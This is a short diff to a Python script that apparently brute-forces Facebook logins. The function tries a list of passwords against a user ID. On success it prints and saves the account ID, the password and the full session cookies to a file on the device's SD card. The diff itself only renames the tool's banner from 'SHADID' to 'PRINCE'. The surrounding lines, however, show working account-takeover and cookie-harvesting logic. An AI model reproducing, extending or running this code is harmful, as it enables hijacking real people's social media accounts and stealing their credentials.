@@ -492,8 +492,7 @@ def ren_sub(uid, pwx, meth, user, fb):
     shadid = random.choice(sys_ua)
     custom_agent = ""
     session = requests.Session()
-    sys.stdout.write(
-        f"\r  \x1b[38;1;155m\x1b[38;5;155m[SHADID-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}"),
+    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}"),
     sys.stdout.flush()
     try:
         for ps in pwx:
@@ -543,7 +542,7 @@ def ren_sub(uid, pwx, meth, user, fb):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 xx=coki.split("c_user=")[1]
                 xd=xx[:15]
-                print(f"\r\r[SHADID-OK] {xd} <> {ps}\n[Cookies]{coki}\n")
+                print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[Cookies]{coki}\n")
                 open("/sdcard/SD-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                 oks.append(xd)
                 break
